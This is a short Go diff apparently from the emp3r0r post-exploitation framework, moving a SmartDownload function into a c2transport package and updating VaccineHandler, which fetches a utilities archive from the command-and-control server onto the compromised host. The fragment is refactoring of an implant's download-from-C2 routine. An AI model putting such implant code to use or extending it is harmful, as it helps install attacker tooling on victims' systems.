@@ -12,6 +12,7 @@ import (
 	"log"
 	"os"
 
+	"github.com/jm33-m0/emp3r0r/core/internal/agent/c2transport"
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/common"
 	"github.com/jm33-m0/emp3r0r/core/internal/def"
 	"github.com/jm33-m0/emp3r0r/core/lib/crypto"
@@ -39,7 +40,7 @@ func VaccineHandler(download_addr, checksum string) (out string) {
 	}
 
 	log.Printf("Downloading utils from %s", def.CCAddress+"www/"+UtilsArchive)
-	_, err := SmartDownload(download_addr, UtilsArchive, UtilsArchivePath, checksum)
+	_, err := c2transport.SmartDownload(download_addr, UtilsArchive, UtilsArchivePath, checksum)
 	out = "[+] Utils have been successfully installed"
 	if err != nil {
 		log.Print("Utils error: " + err.Error())
